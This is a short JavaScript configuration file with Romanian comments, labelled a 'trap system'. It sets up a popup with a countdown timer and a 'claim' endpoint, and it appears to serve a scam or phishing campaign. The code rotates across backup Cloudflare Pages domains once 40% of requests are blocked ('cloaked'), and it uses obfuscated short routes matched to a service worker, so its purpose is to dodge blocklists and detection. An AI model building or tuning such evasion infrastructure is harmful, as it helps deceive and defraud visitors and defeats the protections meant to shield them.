// config.js — configurare globală trap system
// Editează ROTATION_DOMAINS cu domeniile tale Cloudflare Pages
window.__CONFIG = window.__CONFIG || {};

Object.assign(window.__CONFIG, {

  // Domenii pentru rotație (ID-ul domain-rotation.js)
  // Adaugă min 2 domenii backup în caz că primul e cloaked
  ROTATION_DOMAINS: [
    'https://recoreco.pages.dev',          // principal
    // 'https://recoreco2.pages.dev',      // backup 1 — decomentează după deploy
    // 'https://your-custom-domain.com',   // backup 2 — custom domain
  ],

  // Pragul de cloak rate peste care se face rotația (0.0 - 1.0)
  CLOAK_THRESHOLD: 0.40,     // 40% din request-uri blocked = rotate

  // Delay popup (ms) — override de la server prin window.__ab.delay
  POPUP_DELAY_MS: 20000,

  // Countdown în popup (secunde)
  POPUP_COUNTDOWN_S: 300,    // 5 minute

  // Rute obfuscate (ID 15) — matching cu SW route map
  ROUTES: {
    claim:  '/c',   // /api/claim
    health: '/h',   // /api/health
    event:  '/e',   // /api/event
    visit:  '/v',   // /api/visit
    popup:  '/p'    // /popup/index.html
  },

  // Freq cap — nu arăta popup de mai mult de o dată per sesiune
  FREQ_CAP_ENABLED: true,

  // Debug mode — log-uri suplimentare în consolă (dezactivat în producție)
  DEBUG: false

});
